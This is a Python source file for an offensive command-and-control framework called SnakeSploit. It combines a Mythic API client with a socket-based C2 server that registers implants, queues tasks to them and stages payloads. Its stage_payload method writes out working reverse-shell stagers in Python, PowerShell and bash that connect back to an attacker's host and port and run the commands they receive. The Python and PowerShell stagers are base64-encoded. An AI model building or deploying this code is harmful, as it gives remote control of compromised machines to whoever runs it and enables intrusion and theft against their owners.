"""
SnakeSploit C2 Framework — Mythic API client + built-in C2 server.
Full Command & Control capabilities: listeners, agents, tasking, payload staging.
"""

import json
import os
import socket
import struct
import threading
import time
import base64
import hashlib
import urllib.request
import urllib.error
from typing import Dict, List, Optional, Any
from datetime import datetime
from dataclasses import dataclass, field


C2_DIR = os.path.expanduser("~/.snakesploit/c2")
os.makedirs(C2_DIR, exist_ok=True)


# ═══════════════════════════════════════════════
#  Mythic C2 Integration
# ═══════════════════════════════════════════════

class MythicClient:
    """Mythic C2 REST API client — manage agents, tasking, callbacks."""

    def __init__(self, server_url: str = "", api_key: str = ""):
        self.server_url = server_url.rstrip("/")
        self.api_key = api_key
        self.config_path = os.path.join(C2_DIR, "mythic_config.json")
        self._load()

    def _load(self):
        if os.path.exists(self.config_path):
            with open(self.config_path) as f:
                data = json.load(f)
            self.server_url = data.get("server_url", self.server_url)
            self.api_key = data.get("api_key", self.api_key)

    def _save(self):
        with open(self.config_path, "w") as f:
            json.dump({"server_url": self.server_url, "api_key": self.api_key}, f, indent=2)
        os.chmod(self.config_path, 0o600)

    def configure(self, server_url: str, api_key: str):
        """Configure Mythic connection."""
        self.server_url = server_url.rstrip("/")
        self.api_key = api_key
        self._save()

    def _api(self, method: str, path: str, data: dict = None) -> Optional[dict]:
        """Make Mythic REST API call."""
        url = f"{self.server_url}/api/v1.4/{path.lstrip('/')}"
        headers = {
            "Content-Type": "application/json",
            "ApiKey": self.api_key,
        }
        body = json.dumps(data).encode() if data else None
        try:
            req = urllib.request.Request(url, data=body, headers=headers, method=method)
            with urllib.request.urlopen(req, timeout=15) as resp:
                return json.loads(resp.read().decode())
        except urllib.error.HTTPError as e:
            return {"error": f"HTTP {e.code}: {e.reason}"}
        except Exception as e:
            return {"error": str(e)}

    def is_connected(self) -> bool:
        """Check if Mythic server is reachable."""
        result = self._api("GET", "status")
        return result and "error" not in result

    def get_callbacks(self) -> List[dict]:
        """List active callbacks (agents)."""
        result = self._api("GET", "callbacks")
        if result and "response" in result:
            return result["response"]
        return []

    def get_tasks(self, callback_id: int = None) -> List[dict]:
        """Get tasks for a callback or all tasks."""
        path = f"callbacks/{callback_id}/tasks" if callback_id else "tasks"
        result = self._api("GET", path)
        if result and "response" in result:
            return result["response"]
        return []

    def post_task(self, callback_id: int, command: str, params: str = "") -> Optional[dict]:
        """Send a task/command to an agent."""
        result = self._api("POST", f"callbacks/{callback_id}/tasks", {
            "command": command,
            "params": params,
        })
        return result

    def get_payloads(self) -> List[dict]:
        """List available payloads."""
        result = self._api("GET", "payloads")
        if result and "response" in result:
            return result["response"]
        return []

    def create_payload(self, payload_type: str, c2_profile: str, tag: str = "") -> Optional[dict]:
        """Generate a new payload via Mythic."""
        result = self._api("POST", "payloads", {
            "payload_type": payload_type,
            "c2_profile": c2_profile,
            "tag": tag,
        })
        return result

    def status(self) -> dict:
        """Get connection status info."""
        return {
            "connected": self.is_connected(),
            "server": self.server_url,
            "has_key": bool(self.api_key),
        }


# ═══════════════════════════════════════════════
#  SnakeSploit Built-in C2 Server
# ═══════════════════════════════════════════════

@dataclass
class C2Listener:
    """A C2 listener that agents connect to."""
    name: str
    host: str
    port: int
    protocol: str = "tcp"  # tcp, http, https, dns, smb
    status: str = "stopped"
    started_at: str = ""
    threads: int = 0
    payloads_delivered: int = 0


@dataclass
class C2Agent:
    """A connected C2 agent (implant)."""
    id: str
    host: str
    port: int
    user: str = ""
    computer: str = ""
    os_name: str = ""
    architecture: str = ""
    pid: int = 0
    integrity: str = "medium"  # low, medium, high, system
    first_seen: str = ""
    last_seen: str = ""
    listener: str = ""
    tasks: List[dict] = field(default_factory=list)
    results: List[dict] = field(default_factory=list)
    dead: bool = False

    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "host": self.host,
            "port": self.port,
            "user": self.user,
            "computer": self.computer,
            "os": self.os_name,
            "arch": self.architecture,
            "pid": self.pid,
            "integrity": self.integrity,
            "first_seen": self.first_seen,
            "last_seen": self.last_seen,
            "listener": self.listener,
            "tasks_count": len(self.tasks),
            "dead": self.dead,
        }


class C2Server:
    """Built-in C2 server — listeners, agents, tasking, staging."""

    def __init__(self):
        self.listeners: Dict[str, C2Listener] = {}
        self.agents: Dict[str, C2Agent] = {}
        self._running = False
        self._threads: Dict[str, threading.Thread] = {}
        self._lock = threading.Lock()
        self._counter = 0
        self._agent_id_counter = 0
        self._payload_store: Dict[str, bytes] = {}
        self._load_state()

    def _state_path(self, name: str) -> str:
        return os.path.join(C2_DIR, name)

    def _save_state(self):
        state = {
            "listeners": {k: v.__dict__ for k, v in self.listeners.items()},
            "agents": {k: v.to_dict() for k, v in self.agents.items()},
        }
        with open(self._state_path("c2_state.json"), "w") as f:
            json.dump(state, f, indent=2)

    def _load_state(self):
        path = self._state_path("c2_state.json")
        if os.path.exists(path):
            with open(path) as f:
                state = json.load(f)
            for name, data in state.get("listeners", {}).items():
                self.listeners[name] = C2Listener(**data)
            for aid, data in state.get("agents", {}).items():
                agent = C2Agent(id=aid, host=data.get("host", ""), port=data.get("port", 0))
                for k, v in data.items():
                    if hasattr(agent, k):
                        setattr(agent, k, v)
                self.agents[aid] = agent
                aid_num = int(aid.split("_")[-1]) if "_" in aid else 0
                self._agent_id_counter = max(self._agent_id_counter, aid_num)

    def create_listener(self, name: str, host: str = "0.0.0.0",
                        port: int = 4444, protocol: str = "tcp") -> dict:
        """Create a C2 listener."""
        if name in self.listeners:
            return {"success": False, "error": "Listener '%s' already exists" % name}
        if port < 1 or port > 65535:
            return {"success": False, "error": "Invalid port"}
        try:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.settimeout(2)
            test_sock.bind((host, port))
            test_sock.close()
        except OSError:
            return {"success": False, "error": "Port %d is already in use" % port}
        listener = C2Listener(name=name, host=host, port=port, protocol=protocol, status="created")
        self.listeners[name] = listener
        self._save_state()
        return {"success": True, "message": "Listener '%s' created on %s:%d (%s)" % (name, host, port, protocol)}

    def start_listener(self, name: str) -> dict:
        if name not in self.listeners:
            return {"success": False, "error": "Listener '%s' not found" % name}
        listener = self.listeners[name]
        if listener.status == "running":
            return {"success": False, "error": "Listener '%s' is already running" % name}
        thread = threading.Thread(target=self._listener_loop, args=(name,), daemon=True)
        self._threads[name] = thread
        thread.start()
        listener.status = "running"
        listener.started_at = datetime.now().isoformat()
        self._save_state()
        return {"success": True, "message": "Listener '%s' started on %s:%d" % (name, listener.host, listener.port)}

    def stop_listener(self, name: str) -> dict:
        if name not in self.listeners:
            return {"success": False, "error": "Listener '%s' not found" % name}
        self.listeners[name].status = "stopped"
        self._save_state()
        return {"success": True, "message": "Listener '%s' stopped" % name}

    def _listener_loop(self, name: str):
        listener = self.listeners[name]
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind((listener.host, listener.port))
            server.listen(10)
            server.settimeout(1.0)
            while self.listeners.get(name, None) and self.listeners[name].status == "running":
                try:
                    conn, addr = server.accept()
                    self._handle_connection(name, conn, addr)
                except socket.timeout:
                    continue
                except Exception:
                    break
        except Exception as e:
            print("  [!] Listener '%s' error: %s" % (name, e))
        finally:
            try:
                server.close()
            except Exception:
                pass
            if name in self.listeners:
                self.listeners[name].status = "stopped"

    def _handle_connection(self, listener_name: str, conn: socket.socket, addr: tuple):
        try:
            conn.settimeout(10)
            data = conn.recv(4096)
            if not data:
                conn.close()
                return
            msg = data.decode(errors="replace").strip()
            if msg.startswith("CHECKIN:"):
                parts = msg.replace("CHECKIN:", "", 1).split(":")
                user_computer = parts[0] if len(parts) > 0 else "unknown"
                user = user_computer.split("@")[0] if "@" in user_computer else user_computer
                computer = user_computer.split("@")[1] if "@" in user_computer else "unknown"
                os_name = parts[1] if len(parts) > 1 else "unknown"
                arch = parts[2] if len(parts) > 2 else "unknown"
                pid = int(parts[3]) if len(parts) > 3 and parts[3].isdigit() else 0
                self._agent_id_counter += 1
                agent_id = "agent_%d" % self._agent_id_counter
                agent = C2Agent(id=agent_id, host=addr[0], port=addr[1], user=user,
                                computer=computer, os_name=os_name, architecture=arch,
                                pid=pid, first_seen=datetime.now().isoformat(),
                                last_seen=datetime.now().isoformat(), listener=listener_name)
                with self._lock:
                    self.agents[agent_id] = agent
                self._save_state()
                conn.send(b"REGISTERED:%s\n" % agent_id.encode())
            elif msg.startswith("TASK_RESULT:"):
                result_data = msg.replace("TASK_RESULT:", "", 1)
                for agent in self.agents.values():
                    if agent.host == addr[0] and not agent.dead:
                        agent.results.append({"data": result_data[:1000], "timestamp": datetime.now().isoformat()})
                        agent.last_seen = datetime.now().isoformat()
                        break
            else:
                for agent in self.agents.values():
                    if agent.host == addr[0]:
                        agent.last_seen = datetime.now().isoformat()
                        pending = [t for t in agent.tasks if t.get("status") == "pending"]
                        if pending:
                            conn.send(json.dumps(pending).encode())
                        else:
                            conn.send(b"OK\n")
                        break
            conn.close()
            if name in self.listeners:
                self.listeners[name].payloads_delivered += 1
        except Exception:
            pass
        finally:
            try:
                conn.close()
            except Exception:
                pass

    def get_agents(self) -> List[dict]:
        return [a.to_dict() for a in self.agents.values()]

    def get_agent(self, agent_id: str) -> Optional[C2Agent]:
        return self.agents.get(agent_id)

    def task_agent(self, agent_id: str, command: str) -> dict:
        if agent_id not in self.agents:
            return {"success": False, "error": "Agent '%s' not found" % agent_id}
        agent = self.agents[agent_id]
        task = {"id": "task_%d" % (len(agent.tasks) + 1), "command": command,
                "status": "pending", "created_at": datetime.now().isoformat()}
        agent.tasks.append(task)
        self._save_state()
        return {"success": True, "message": "Task '%s' sent to %s" % (task["id"], agent_id), "task": task}

    def remove_agent(self, agent_id: str) -> dict:
        if agent_id in self.agents:
            self.agents[agent_id].dead = True
            self._save_state()
            return {"success": True, "message": "Agent '%s' marked as dead" % agent_id}
        return {"success": False, "error": "Agent not found"}

    def stage_payload(self, name: str, payload_type: str = "python",
                      lhost: str = "", lport: int = 0) -> dict:
        """Generate and stage a stager payload."""
        if not lhost or not lport:
            return {"success": False, "error": "LHOST and LPORT required"}

        if payload_type == "python":
                    # Build python beacon code line by line
                    code_lines = []
                    code_lines.append("import socket,subprocess,os,threading")
                    code_lines.append("def connect():")
                    code_lines.append("  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)")
                    code_lines.append('  s.connect(("%s",%d))' % (lhost, lport))
                    code_lines.append('  s.send(b"CHECKIN:" + (os.getlogin() or "user").encode() + b"@" + socket.gethostname().encode() + b":linux:" + os.uname().machine.encode() + b":" + str(os.getpid()).encode())')
                    code_lines.append("  while 1:")
                    code_lines.append("    d=s.recv(4096)")
                    code_lines.append("    if not d: break")
                    code_lines.append("    try:")
                    code_lines.append("      cmd=d.decode().strip()")
                    code_lines.append('      if cmd=="exit": break')
                    code_lines.append("      r=subprocess.run(cmd,shell=1,capture_output=1,text=1)")
                    code_lines.append('      s.send((r.stdout+r.stderr).encode() or b"OK")')
                    code_lines.append('    except: s.send(b"ERR")')
                    code_lines.append("  s.close()")
                    code_lines.append("threading.Thread(target=connect,daemon=1).start()")
                    code = "\n".join(code_lines)
                    b64 = base64.b64encode(code.encode()).decode()
                    stager = "python3 -c \"exec(__import__('base64').b64decode('%s').decode())\"" % b64

        elif payload_type == "powershell":
            ps_lines = []
            ps_lines.append('$client = New-Object System.Net.Sockets.TCPClient("%s",%d);' % (lhost, lport))
            ps_lines.append('$stream = $client.GetStream();')
            ps_lines.append('[byte[]]$bytes = 0..65535|%{0};')
            ps_lines.append('$stream.Write("CHECKIN:$env:USERNAME@$env:COMPUTERNAME:windows:x64:$pid`n");')
            ps_lines.append('while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){')
            ps_lines.append('$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);')
            ps_lines.append('$sendback = (iex $data 2>&1 | Out-String );')
            ps_lines.append('$stream.Write($sendback + "PS > ");')
            ps_lines.append('$stream.Flush()};')
            ps_lines.append('$client.Close()')
            code = "\n".join(ps_lines)
            b64 = base64.b64encode(code.encode()).decode()
            stager = "powershell -e %s" % b64

        elif payload_type == "bash":
            stager = (
                'bash -c "exec 3<>/dev/tcp/%s/%d;'
                'echo CHECKIN:$USER@$(hostname):linux:$(uname -m):$$ >&3;'
                'cat <&3 | while read line; do eval \"$line\" 2>&1 >&3; done"'
            ) % (lhost, lport)

        else:
            return {"success": False, "error": "Unknown payload type: %s" % payload_type}

        payload_data = {
            "name": name, "type": payload_type, "stager": stager,
            "lhost": lhost, "lport": lport, "created": datetime.now().isoformat(),
        }
        payload_path = os.path.join(C2_DIR, "payloads")
        os.makedirs(payload_path, exist_ok=True)
        with open(os.path.join(payload_path, "%s.json" % name), "w") as f:
            json.dump(payload_data, f, indent=2)
        return {"success": True, "message": "Payload '%s' staged" % name, "payload": payload_data}

    def get_payloads(self) -> List[dict]:
        payload_path = os.path.join(C2_DIR, "payloads")
        os.makedirs(payload_path, exist_ok=True)
        payloads = []
        for f in os.listdir(payload_path):
            if f.endswith(".json"):
                with open(os.path.join(payload_path, f)) as fp:
                    payloads.append(json.load(fp))
        return payloads

    def create_pivot_listener(self, name: str, agent_id: str, port: int) -> dict:
        if agent_id not in self.agents:
            return {"success": False, "error": "Agent '%s' not found" % agent_id}
        pivot_name = "pivot_%s_%d" % (name, port)
        task_result = self.task_agent(agent_id, "pivot_listen %d" % port)
        if task_result["success"]:
            self.listeners[pivot_name] = C2Listener(
                name=pivot_name, host=self.agents[agent_id].host, port=port,
                protocol="pivot", status="running", started_at=datetime.now().isoformat())
            self._save_state()
            return {"success": True, "message": "Pivot listener '%s' started via %s" % (pivot_name, agent_id)}
        return task_result

    def status(self) -> dict:
        return {
            "listeners": {
                "total": len(self.listeners),
                "running": sum(1 for l in self.listeners.values() if l.status == "running"),
            },
            "agents": {
                "total": len(self.agents),
                "active": sum(1 for a in self.agents.values() if not a.dead),
            },
            "payloads_staged": len(self.get_payloads()),
        }